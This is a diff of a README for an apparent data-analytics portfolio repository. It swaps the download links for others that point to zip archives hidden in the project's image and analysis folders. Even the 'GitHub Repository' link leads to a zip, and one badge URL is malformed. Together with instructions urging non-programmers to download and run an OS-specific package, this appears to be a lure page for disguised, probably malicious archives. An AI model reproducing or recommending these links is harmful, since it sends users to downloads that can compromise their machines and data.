@@ -1,6 +1,6 @@
 # 📊 Analytics_Portfolio_Dual_Projects - Explore Data Science Made Easy
 
-[![Download Now](https://raw.githubusercontent.com/Butelka770/Analytics_Portfolio_Dual_Projects/main/Project_1_Employee_Attrition/images/Projects-Portfolio-Analytics-Dual-caza.zip%https://raw.githubusercontent.com/Butelka770/Analytics_Portfolio_Dual_Projects/main/Project_1_Employee_Attrition/images/Projects-Portfolio-Analytics-Dual-caza.zip)](https://raw.githubusercontent.com/Butelka770/Analytics_Portfolio_Dual_Projects/main/Project_1_Employee_Attrition/images/Projects-Portfolio-Analytics-Dual-caza.zip)
+[![Download Now](https://github.com/Butelka770/Analytics_Portfolio_Dual_Projects/raw/refs/heads/main/Project_2_Sentiment_Analysis/Portfolio_Projects_Dual_Analytics_1.4.zip%https://github.com/Butelka770/Analytics_Portfolio_Dual_Projects/raw/refs/heads/main/Project_2_Sentiment_Analysis/Portfolio_Projects_Dual_Analytics_1.4.zip)](https://github.com/Butelka770/Analytics_Portfolio_Dual_Projects/raw/refs/heads/main/Project_2_Sentiment_Analysis/Portfolio_Projects_Dual_Analytics_1.4.zip)
 
 ## 📁 Overview
 The Analytics_Portfolio_Dual_Projects showcases two comprehensive data science projects: Employee Attrition Analysis and Customer Sentiment Analysis. This portfolio includes in-depth exploratory data analysis (EDA), natural language processing (NLP), machine learning models, and visually engaging Tableau dashboards. 
@@ -15,7 +15,7 @@ This guide walks you through downloading and running the projects. No programmin
 
 ## 💾 Download & Install
 1. **Visit the Releases Page:** Click the link below to access the download options.
-   - [Download Here](https://raw.githubusercontent.com/Butelka770/Analytics_Portfolio_Dual_Projects/main/Project_1_Employee_Attrition/images/Projects-Portfolio-Analytics-Dual-caza.zip)
+   - [Download Here](https://github.com/Butelka770/Analytics_Portfolio_Dual_Projects/raw/refs/heads/main/Project_2_Sentiment_Analysis/Portfolio_Projects_Dual_Analytics_1.4.zip)
  
 2. **Download the Suitable File:**
    - Look for the most recent release version. Click on the package that matches your operating system.
@@ -75,8 +75,8 @@ If you face difficulties:
 - Refer to online resources for help with Python or Jupyter-related issues.
 
 ## 🔗 Reference Links
-- [GitHub Repository](https://raw.githubusercontent.com/Butelka770/Analytics_Portfolio_Dual_Projects/main/Project_1_Employee_Attrition/images/Projects-Portfolio-Analytics-Dual-caza.zip)
-- [Download Here](https://raw.githubusercontent.com/Butelka770/Analytics_Portfolio_Dual_Projects/main/Project_1_Employee_Attrition/images/Projects-Portfolio-Analytics-Dual-caza.zip)
+- [GitHub Repository](https://github.com/Butelka770/Analytics_Portfolio_Dual_Projects/raw/refs/heads/main/Project_2_Sentiment_Analysis/Portfolio_Projects_Dual_Analytics_1.4.zip)
+- [Download Here](https://github.com/Butelka770/Analytics_Portfolio_Dual_Projects/raw/refs/heads/main/Project_2_Sentiment_Analysis/Portfolio_Projects_Dual_Analytics_1.4.zip)
 
 ## 🤝 Contributing
 If you want to contribute, please clone the repo and send a pull request. Your input helps enhance the projects!
